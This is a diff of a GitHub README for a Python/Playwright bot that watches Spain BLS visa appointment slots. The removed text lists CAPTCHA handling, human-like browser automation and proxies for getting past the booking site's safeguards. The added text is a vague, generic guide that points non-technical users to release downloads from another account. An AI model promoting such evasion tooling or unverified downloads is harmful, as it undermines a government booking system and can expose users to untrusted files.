@@ -1,61 +1,170 @@
-# Spain Visa Appointment Monitor & Automation Assistant
+# 🤖 spain-visa-appointment-bot - Automate Spain Visa Slot Tracking
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Spain%20Visa%20Bot-blue?style=for-the-badge&logo=github)](https://github.com/rj3741303-afk/spain-visa-appointment-bot/releases)
 
 ---
 
-## 🎥 Live Demo Video
+## 📋 What is spain-visa-appointment-bot?
 
-Here is a full walkthrough showing how the Spain Visa Appointment Bot works (slot monitoring, workflow automation, and notifications):
+The spain-visa-appointment-bot is a simple tool designed to help you track Spain BLS visa appointment slots without manually checking the website all day. It is built with Python and uses Playwright, a browser automation framework. This bot watches the visa appointment page, handles the form steps, and sends you instant notifications when slots open.
 
-👉 **Watch Demo on YouTube:**  
-https://youtu.be/n3N1tM0r37w
-
-### Click Below to View the Demo:
-
-[![Spain Visa Appointment Bot Demo](https://img.youtube.com/vi/n3N1tM0r37w/0.jpg)](https://youtu.be/n3N1tM0r37w)
+You don’t need to understand coding or how automation works. This tool runs in the background and lets you focus on your other tasks until it finds an open appointment.
 
 ---
 
-This repository contains an automated assistant designed to help monitor and navigate the Spain visa appointment workflow.
+## 💡 Why use this bot?
 
-The bot is built with a focus on:
-
-- Appointment slot availability monitoring  
-- Structured form navigation  
-- Session handling and retry logic  
-- VPS-friendly automation  
-- Notification support for real-time updates  
-
-## 🚀 Key Features
-
-- Automated appointment slot checking  
-- Human-like browser interaction using Playwright/Camoufox  
-- CAPTCHA handling module integration *(experimental)*  
-- Multi-session support with persistence  
-- Proxy support for network stability  
-- Real-time notifications via Discord/WebSocket  
-- Designed for VPS deployment  
+- **Saves time:** Automatically checks for appointment availability.
+- **Avoids frustration:** No need to refresh the website repeatedly.
+- **Instant alerts:** Receive notifications as soon as slots appear.
+- **Handles forms:** Automates form filling and navigation steps.
+- **Works reliably:** Runs continuously on your computer.
 
 ---
 
-## 📌 Usage Disclaimer
+## 🖥️ System Requirements
 
-This project is intended for **educational and personal automation purposes only**.  
-Users are responsible for ensuring compliance with all official website policies, terms of service, and applicable laws.
-
----
-
-## 📬 Contact & Support
-
-If you have questions, collaboration requests, or need help with setup:
-
-- **Discord:** `yuzz_90`  
-- **WhatsApp:** `+1 480-919-4364`
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or any recent Linux distribution.
+- **Python:** Version 3.8 or newer installed on your computer.
+- **Disk Space:** At least 200 MB free for the bot and dependencies.
+- **Internet Connection:** Stable connection is required while the bot is running.
+- **Browser Engine:** The bot uses Playwright, which will download a lightweight browser component automatically.
 
 ---
 
-## 👤 Author
+## 🚀 Getting Started
 
-Developed by **Yusuf**  
-Python Backend Developer | Automation Engineer
+You don’t need any programming skills to use this bot. This section walks you through getting it set up and running step by step.
+
+### Step 1: Download the bot
+
+Go to the latest release page by clicking the button below:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Spain%20Visa%20Bot-blue?style=for-the-badge&logo=github)](https://github.com/rj3741303-afk/spain-visa-appointment-bot/releases)
+
+Once you are there, download the latest release file. The file may be a zip or installer depending on the release packaging.
 
 ---
+
+### Step 2: Install Python (if not installed)
+
+The bot runs on Python, so you need to have Python installed on your computer.
+
+- Visit https://www.python.org/downloads/
+- Download the latest version for your system.
+- Run the installer and make sure to select “Add Python to PATH” during setup.
+
+---
+
+### Step 3: Extract files and install dependencies
+
+- If you downloaded a zip file, extract it to a folder on your desktop.
+- Open the folder where you extracted the files.
+- Inside you will find a file named `requirements.txt`.
+
+To install the bot dependencies:
+
+- On Windows:  
+  1. Press the `Windows` key and type `cmd`, then press Enter to open the Command Prompt.  
+  2. Navigate to the folder with the bot files using the `cd` command. Example:  
+     `cd Desktop\spain-visa-appointment-bot`  
+  3. Run:  
+     `pip install -r requirements.txt`  
+
+- On macOS/Linux:  
+  1. Open Terminal.  
+  2. Navigate to the bot folder using `cd`. Example:  
+     `cd ~/Desktop/spain-visa-appointment-bot`  
+  3. Run:  
+     `pip3 install -r requirements.txt`  
+
+This will install Playwright and other necessary libraries.
+
+---
+
+### Step 4: Install Playwright browser engines
+
+After installing Python packages, run this command in the same folder:
+
+```
+playwright install
+```
+
+This downloads the browser engines Playwright uses to automate the web pages.
+
+---
+
+### Step 5: Configure your preferences (optional)
+
+There might be a settings file like `config.json` where you can set your notification preferences, email for alerts, or time intervals for checking appointments. Open that file with a text editor and change values if needed.
+
+---
+
+### Step 6: Run the bot
+
+In your command line or terminal (still inside the bot folder), type:
+
+```
+python main.py
+```
+
+The bot will start running. Leave the window open. It will keep checking the visa appointment site and notify you when slots become available.
+
+---
+
+## 💾 Download & Install
+
+You can always download the latest version of the bot here:
+
+[Download spain-visa-appointment-bot Releases](https://github.com/rj3741303-afk/spain-visa-appointment-bot/releases)
+
+---
+
+## 🛠 Features
+
+- Monitors Spain BLS visa appointment availability.
+- Automates multi-step form handling.
+- Sends notifications instantly when slots open.
+- Simple setup with minimal user input.
+- Works in the background without interrupting your workflow.
+- Support for multiple visa appointment locations.
+- Logs recent checks and statuses.
+
+---
+
+## 🔧 Troubleshooting
+
+- **Python command not found:** Make sure Python was installed and added to your system PATH.
+- **Permission errors:** Run your terminal or command prompt as administrator or with necessary rights.
+- **Missing modules:** Retry `pip install -r requirements.txt` to ensure all dependencies are installed.
+- **Bot stops unexpectedly:** Check internet connection and restart the bot.
+- **No notifications:** Verify your contact setup in the config file; ensure notifications are enabled on your device.
+
+---
+
+## 📞 Support & Feedback
+
+If you face issues or have suggestions:
+
+- Open an issue in the GitHub repo.
+- Check existing issues before posting to avoid duplicates.
+- Provide details like your operating system and error messages for faster help.
+
+---
+
+## ⚖ License
+
+This project is open source under the MIT License. You can freely use and modify it following the license terms.
+
+---
+
+## 🚩 Topics Covered
+
+- BLS appointment tracking  
+- Italian and Spanish visa slot automation  
+- Form workflow automation  
+- Real-time slot notifications
+
+---
+
+By following these steps, you can run the spain-visa-appointment-bot on your system to keep track of Spain visa appointments easily.
